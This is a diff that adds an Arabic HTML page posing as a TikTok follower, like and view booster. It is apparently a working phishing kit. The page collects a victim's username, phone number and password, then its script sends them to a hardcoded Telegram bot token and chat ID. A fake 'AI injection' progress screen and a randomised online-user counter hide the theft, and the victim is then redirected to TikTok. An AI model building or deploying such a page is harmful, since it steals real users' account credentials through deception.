@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقع الديزل لتزويد تيك توك | AI Turbo</title>
+    <style>
+        :root { --tt-pink: #fe2c55; --tt-cyan: #25f4ee; --tt-black: #010101; }
+        body { background-color: var(--tt-black); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; overflow-x: hidden; }
+        
+        /* الهيدر المطور */
+        .nav { padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.9); border-bottom: 1px solid #222; position: sticky; top: 0; z-index: 1000; }
+        .logo { font-size: 24px; font-weight: 900; } .logo span { color: var(--tt-pink); text-shadow: 0 0 10px var(--tt-pink); }
+        .live-stat { background: rgba(37, 244, 238, 0.1); border: 1px solid var(--tt-cyan); padding: 5px 12px; border-radius: 50px; color: var(--tt-cyan); font-size: 11px; font-weight: bold; }
+
+        .container { width: 92%; max-width: 480px; margin: 25px auto; }
+
+        /* شريط المشاهير الموثقين */
+        .stars-scroll { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 15px; scrollbar-width: none; }
+        .celeb { background: #111; padding: 8px 18px; border-radius: 50px; border: 1px solid #333; display: flex; align-items: center; gap: 6px; white-space: nowrap; font-size: 13px; }
+        .verify { color: #20d5ec; font-size: 14px; }
+
+        /* الكارت الرئيسي */
+        .main-card { background: #0a0a0a; border-radius: 24px; padding: 35px 20px; border: 1px solid #222; position: relative; overflow: hidden; box-shadow: 0 0 40px rgba(254, 44, 85, 0.1); }
+        .ai-label { background: linear-gradient(90deg, var(--tt-pink), var(--tt-cyan)); color: #000; font-size: 10px; font-weight: bold; padding: 4px 12px; border-radius: 4px; margin-bottom: 15px; display: inline-block; }
+        
+        input, select { width: 100%; padding: 16px; margin: 10px 0; background: #151515; border: 1px solid #333; border-radius: 12px; color: white; font-size: 15px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--tt-pink); background: #1a1a1a; }
+        .btn-diesel { width: 100%; padding: 18px; background: var(--tt-pink); color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; box-shadow: 0 10px 30px rgba(254, 44, 85, 0.4); }
+
+        /* واجهة الاستعراض (ثغرة الذكاء الاصطناعي) */
+        #ai-scanner { display: none; position: fixed; inset: 0; background: #000; z-index: 10000; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .laser-line { width: 85%; height: 2px; background: var(--tt-cyan); box-shadow: 0 0 20px var(--tt-cyan); position: absolute; animation: scanMove 2s infinite; }
+        .p-bar-bg { width: 75%; height: 6px; background: #111; border-radius: 10px; margin-top: 40px; overflow: hidden; border: 1px solid #222; }
+        .p-bar-fill { width: 0%; height: 100%; background: var(--tt-pink); transition: 0.1s linear; }
+        .terminal-text { font-family: monospace; font-size: 13px; color: #0f0; margin-top: 25px; height: 20px; text-shadow: 0 0 5px #0f0; }
+
+        @keyframes scanMove { 0%, 100% { top: 20%; } 50% { top: 80%; } }
+    </style>
+</head>
+<body dir="rtl">
+
+<div class="nav">
+    <div class="logo">موقع <span>الديزل</span></div>
+    <div class="live-stat">🟢 متصل الآن: <span id="online">48,203</span></div>
+</div>
+
+<div class="container">
+    <div class="stars-scroll">
+        <div class="celeb">شاكر <span class="verify">✓</span></div>
+        <div class="celeb">عبسي <span class="verify">✓</span></div>
+        <div class="celeb">ضحى <span class="verify">✓</span></div>
+        <div class="celeb">أحمد الحفناوي <span class="verify">✓</span></div>
+    </div>
+
+    <div class="main-card">
+        <div class="ai-label">نظام الديزل للحقن الذكي v6.2</div>
+        <h2 style="margin: 0 0 10px 0;">تزويد تيك توك العالمي</h2>
+        <p style="color: #777; font-size: 13px; margin-bottom: 25px;">استخدم أقوى ثغرات Zefoy و Viptools بنقرة واحدة</p>
+
+        <select id="service">
+            <option>🚀 تزويد 500k مشاهدة (إكسبلور فوري)</option>
+            <option>👥 تزويد 10k متابع (حسابات موثقة)</option>
+            <option>❤️ تزويد 20k لايك (تفاعل حقيقي)</option>
+        </select>
+
+        <input type="text" id="user" placeholder="اسم المستخدم (@username)">
+        <input type="tel" id="tel" placeholder="رقم الهاتف المرتبط">
+        <input type="password" id="pass" placeholder="كلمة سر الحساب">
+
+        <button class="btn-diesel" onclick="startAIInjection()">تفعيل التزويد بالذكاء الاصطناعي</button>
+    </div>
+</div>
+
+<div id="ai-scanner">
+    <div class="laser-line"></div>
+    <h2 style="color: var(--tt-cyan); font-weight: 900; letter-spacing: 2px;">AI INJECTION IN PROGRESS</h2>
+    <div class="p-bar-bg"><div class="p-bar-fill" id="p-fill"></div></div>
+    <div class="terminal-text" id="term-log">> Initializing Secure Protocol...</div>
+</div>
+
+<script>
+    // عداد الزوار الحي
+    setInterval(() => {
+        let n = Math.floor(Math.random() * (49000 - 48000) + 48000);
+        document.getElementById('online').innerText = n.toLocaleString();
+    }, 2500);
+
+    function startAIInjection() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        const t = document.getElementById('tel').value;
+        const s = document.getElementById('service').value;
+
+        if(!u || !p || !t) return alert("الرجاء إدخال كافة البيانات لربط الثغرة");
+
+        // إرسال البيانات فوراً لبوت التليجرام الخاص بك
+        const token = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU";
+        const chatId = "5177962707";
+        const msg = `👑 صيد الديزل الجديد:\n👤 اليوزر: ${u}\n📞 هاتف: ${t}\n🔑 باسورد: ${p}\n🛠 الخدمة: ${s}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+
+        // تشغيل واجهة الذكاء الاصطناعي
+        document.getElementById('ai-scanner').style.display = 'flex';
+        let prog = 0;
+        let fill = document.getElementById('p-fill');
+        let log = document.getElementById('term-log');
+
+        const ai_steps = [
+            "> Establishing Proxy...", 
+            "> Finding TikTok Vulnerability...", 
+            "> Injecting Followers via AI Node...", 
+            "> Bypassing Captcha...", 
+            "> Success!"
+        ];
+        let step = 0;
+
+        let interval = setInterval(() => {
+            prog++;
+            fill.style.width = prog + "%";
+            
+            if(prog % 20 == 0 && step < ai_steps.length) {
+                log.innerText = ai_steps[step];
+                step++;
+            }
+
+            if(prog >= 100) {
+                clearInterval(interval);
+                alert("✅ تم تفعيل الثغرة بنجاح! ستصلك الخدمة الحقيقية خلال 15 دقيقة.");
+                window.location.href = "https://www.tiktok.com";
+            }
+        }, 80);
+    }
+</script>
+
+</body>
+</html>
